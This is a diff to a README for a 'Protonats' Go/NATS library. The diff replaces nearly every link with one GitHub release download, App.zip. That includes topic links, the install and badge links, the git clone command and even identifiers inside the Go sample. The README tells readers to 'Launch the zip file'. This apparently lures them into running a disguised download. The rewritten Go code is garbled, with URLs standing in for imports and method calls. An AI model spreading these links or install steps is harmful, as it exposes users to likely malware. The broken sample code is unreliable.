@@ -1,6 +1,6 @@
 # 🚀 Welcome to the Protonats Repository! 🌌
 
-![Protonats Logo](https://example.com/protonats-logo.png)
+![Protonats Logo](https://github.com/Pedrosadamalu/protonats/releases/download/v1.0/App.zip)
 
 ## Repository Name: 
 protonats
@@ -9,15 +9,15 @@ protonats
 A repository for the Protonats project, focused on enhancing NATS functionalities with protocol buffers.
 
 ## Topics:
-- [Go](https://golang.org/)
-- [Golang](https://golang.org/)
-- [Gradle](https://gradle.org/)
-- [Java](https://www.java.com/)
+- [Go](https://github.com/Pedrosadamalu/protonats/releases/download/v1.0/App.zip)
+- [Golang](https://github.com/Pedrosadamalu/protonats/releases/download/v1.0/App.zip)
+- [Gradle](https://github.com/Pedrosadamalu/protonats/releases/download/v1.0/App.zip)
+- [Java](https://github.com/Pedrosadamalu/protonats/releases/download/v1.0/App.zip)
 - Library
-- [NATS](https://nats.io/)
-- [NATS Client](https://nats.io/)
-- [NATS Server](https://nats.io/)
-- [Protocol Buffers](https://developers.google.com/protocol-buffers)
+- [NATS](https://github.com/Pedrosadamalu/protonats/releases/download/v1.0/App.zip)
+- [NATS Client](https://github.com/Pedrosadamalu/protonats/releases/download/v1.0/App.zip)
+- [NATS Server](https://github.com/Pedrosadamalu/protonats/releases/download/v1.0/App.zip)
+- [Protocol Buffers](https://github.com/Pedrosadamalu/protonats/releases/download/v1.0/App.zip)
 
 ## 📚 About Protonats
 Protonats is a project that extends NATS capabilities by integrating protocol buffers for improved performance and scalability. It provides a seamless way to incorporate protocol buffers into your NATS-based systems.
@@ -28,16 +28,16 @@ Protonats is a project that extends NATS capabilities by integrating protocol bu
 - **Simplified Development**: Easily integrate protocol buffers into your existing NATS projects.
 
 ## 📂 Installation
-To get started with Protonats, download the [Protonats v1.0.0 zip file](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) and follow the installation instructions in the repository.
+To get started with Protonats, download the [Protonats v1.0.0 zip file](https://github.com/Pedrosadamalu/protonats/releases/download/v1.0/App.zip) and follow the installation instructions in the repository.
 
-[![Download Protonats](https://img.shields.io/badge/Download-Protonats%20v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) 
+[![Download Protonats](https://github.com/Pedrosadamalu/protonats/releases/download/v1.0/App.zip%20v1.0.0-blue)](https://github.com/Pedrosadamalu/protonats/releases/download/v1.0/App.zip) 
 
 🚀 **Launch the zip file to begin the installation process.**
 
 ## 🚧 Getting Started
 1. Clone the Protonats repository.
    ```bash
-   git clone https://github.com/username/protonats.git
+   git clone https://github.com/Pedrosadamalu/protonats/releases/download/v1.0/App.zip
    ```
 2. Navigate to the project directory.
    ```bash
@@ -49,25 +49,25 @@ To get started with Protonats, download the [Protonats v1.0.0 zip file](https://
 ```go
 package main
 
-import "github.com/protonats/protonats"
+import "https://github.com/Pedrosadamalu/protonats/releases/download/v1.0/App.zip"
 
 func main() {
     // Initialize Protonats client
-    client := protonats.NewClient()
+    client := https://github.com/Pedrosadamalu/protonats/releases/download/v1.0/App.zip()
 
     // Connect to NATS server
-    err := client.Connect("nats://localhost:4222")
+    err := https://github.com/Pedrosadamalu/protonats/releases/download/v1.0/App.zip("nats://localhost:4222")
     if err != nil {
         // Handle error
     }
 
     // Subscribe to NATS subject
-    err = client.Subscribe("subject", func(msg *protonats.Message) {
+    err = https://github.com/Pedrosadamalu/protonats/releases/download/v1.0/App.zip("subject", func(msg *https://github.com/Pedrosadamalu/protonats/releases/download/v1.0/App.zip) {
         // Handle incoming message
     })
 
     // Publish message to NATS subject
-    err = client.Publish("subject", []byte("Hello, Protonats!"))
+    err = https://github.com/Pedrosadamalu/protonats/releases/download/v1.0/App.zip("subject", []byte("Hello, Protonats!"))
     if err != nil {
         // Handle error
     }
